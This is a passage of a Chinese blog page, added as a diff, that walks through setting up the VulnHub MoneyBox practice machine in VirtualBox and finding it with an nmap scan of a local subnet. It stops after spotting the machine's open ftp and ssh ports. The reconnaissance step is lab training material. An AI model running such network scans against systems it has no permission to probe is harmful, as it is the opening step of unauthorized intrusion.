@@ -1,0 +1,992 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/tubiao.png">
+  <link rel="icon" href="/img/tubiao.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#4F4F4F">
+  <meta name="author" content="chen">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="借鉴文章： https:&#x2F;&#x2F;blog.csdn.net&#x2F;YueXuan_521&#x2F;article&#x2F;details&#x2F;135324089 https:&#x2F;&#x2F;blog.csdn.net&#x2F;Aluxian_&#x2F;article&#x2F;details&#x2F;128672602  安装靶机靶机网址：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;moneybox-1,653&#x2F; VirtualBox网址：https:&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnHub靶机MoneyBox复现">
+<meta property="og:url" content="https://yschen20.github.io/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="(๑´ڡ&#96;๑)">
+<meta property="og:description" content="借鉴文章： https:&#x2F;&#x2F;blog.csdn.net&#x2F;YueXuan_521&#x2F;article&#x2F;details&#x2F;135324089 https:&#x2F;&#x2F;blog.csdn.net&#x2F;Aluxian_&#x2F;article&#x2F;details&#x2F;128672602  安装靶机靶机网址：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;moneybox-1,653&#x2F; VirtualBox网址：https:&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425212824436.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425213050136.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425213231938.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425213349283.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425213553737.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425215240799.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425215312978.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425215622260.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425225742643.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425225704959.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425230118925.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425230430356.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425231606085.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425232151081.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425232255654.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/trytofind.jpg">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425232905214.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425233220536.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425233302824.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425233509276.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425233628440.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425233953950.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425233827255.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425233859495.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425234146632.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425234441416.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425234600624.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425235415886.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425235553250.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425235646192.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425235835395.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425235945856.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426000034742.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426000206950.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426000351201.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426000506824.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426002159693.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426001618917.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426002453872.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426002935648.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426003043780.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426003329930.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426003425435.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426003730564.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426003845131.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426004313655.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426004720854.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426004801020.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426004839093.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426005156575.png">
+<meta property="article:published_time" content="2025-04-25T17:04:39.000Z">
+<meta property="article:modified_time" content="2025-04-25T17:06:33.921Z">
+<meta property="article:author" content="chen">
+<meta property="article:tag" content="渗透 打靶、复现">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://yschen20.github.io/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425212824436.png">
+<meta name="twitter:creator" content="@chen">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>VulnHub靶机MoneyBox复现 - (๑´ڡ`๑)</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"yschen20.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2025-04-25T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>小晨的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/2.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="VulnHub靶机MoneyBox复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        chen
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-04-26 01:04" pubdate>
+          2025年4月26日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          14 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">VulnHub靶机MoneyBox复现</h1>
+            
+              <p id="updated-time" class="note note-info" style="display: none">
+                
+                  
+                    本文最后更新于 2025-04-26T01:06:33+08:00
+                  
+                  
+
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>借鉴文章：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/YueXuan_521/article/details/135324089">https://blog.csdn.net/YueXuan_521/article/details/135324089</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Aluxian_/article/details/128672602">https://blog.csdn.net/Aluxian_/article/details/128672602</a></p>
+</blockquote>
+<h1 id="安装靶机"><a href="#安装靶机" class="headerlink" title="安装靶机"></a>安装靶机</h1><p>靶机网址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/moneybox-1,653/">https://www.vulnhub.com/entry/moneybox-1,653/</a></p>
+<p>VirtualBox网址：<a target="_blank" rel="noopener" href="https://www.oracle.com/cn/virtualization/technologies/vm/downloads/virtualbox-downloads.html">https://www.oracle.com/cn/virtualization/technologies/vm/downloads/virtualbox-downloads.html</a></p>
+<p>如果出现以下报错</p>
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425212824436.png" srcset="/img/loading.gif" lazyload alt="image-20250425212824436"></p>
+<p>就需要对安装目录给予权限，我的安装目录是 <code>E:\VirtualBox</code> ，就以管理员身份打开命令提示符，输入以下命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">icacls E:\VirtualBox /reset /t /c<br>icacls E:\VirtualBox /inheritance:d /t /c<br>icacls E:\VirtualBox /grant *S-1-5-32-545:(OI)(CI)(RX) /t /c<br>icacls E:\VirtualBox /deny *S-1-5-32-545:(DE,WD,AD,WEA,WA) /t /c<br>icacls E:\VirtualBox /grant *S-1-5-11:(OI)(CI)(RX) /t /c<br>icacls E:\VirtualBox /deny *S-1-5-11:(DE,WD,AD,WEA,WA) /t /c<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425213050136.png" srcset="/img/loading.gif" lazyload alt="image-20250425213050136"></p>
+<p>直接选择是，后面的默认选择即可</p>
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425213231938.png" srcset="/img/loading.gif" lazyload alt="image-20250425213231938"></p>
+<p>安装好后以管理员身份打开，导入下载好的<code>MONEYBOX.ova</code></p>
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425213349283.png" srcset="/img/loading.gif" lazyload alt="image-20250425213349283"></p>
+<p>然后选择好安装目录，等着导入好就行</p>
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425213553737.png" srcset="/img/loading.gif" lazyload alt="image-20250425213553737"></p>
+<p>选择启动，可能出现以下报错</p>
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425215240799.png" srcset="/img/loading.gif" lazyload alt="image-20250425215240799"></p>
+<p>更改网络设置，使用桥连网卡即可</p>
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425215312978.png" srcset="/img/loading.gif" lazyload alt="image-20250425215312978"></p>
+<h1 id="IP探测"><a href="#IP探测" class="headerlink" title="IP探测"></a>IP探测</h1><h3 id="寻找靶机"><a href="#寻找靶机" class="headerlink" title="寻找靶机"></a>寻找靶机</h3><p>需要准备一台kali，要和靶机处于同一个网段（可以都用桥接模式）</p>
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425215622260.png" srcset="/img/loading.gif" lazyload alt="image-20250425215622260"></p>
+<p>首先获取kali的网卡信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ifconfig<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425225742643.png" srcset="/img/loading.gif" lazyload alt="image-20250425225742643"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kali的IP：192.168.1.103<br></code></pre></td></tr></table></figure>
+
+<h4 id="使用nmap工具扫描"><a href="#使用nmap工具扫描" class="headerlink" title="使用nmap工具扫描"></a>使用<code>nmap</code>工具扫描</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap 192.168.1.0/24<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>**<code>nmap</code>：**网络探索和安全扫描工具</li>
+<li>**<code>192.168.1.0/24：</code> **目标 IP 地址范围。这里的<code>/24</code>表示子网掩码为 <code>255.255.255.0</code>，这意味着 Nmap 将扫描从<code>192.168.1.1</code>到<code>192.168.1.254</code>的所有 IP 地址</li>
+</ul>
+<p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425225704959.png" srcset="/img/loading.gif" lazyload alt="image-20250425225704959"></p>
+<p>看到这个机器开了<code>ftp</code>和<code>ssh</code>，就可以知道是靶机</p>
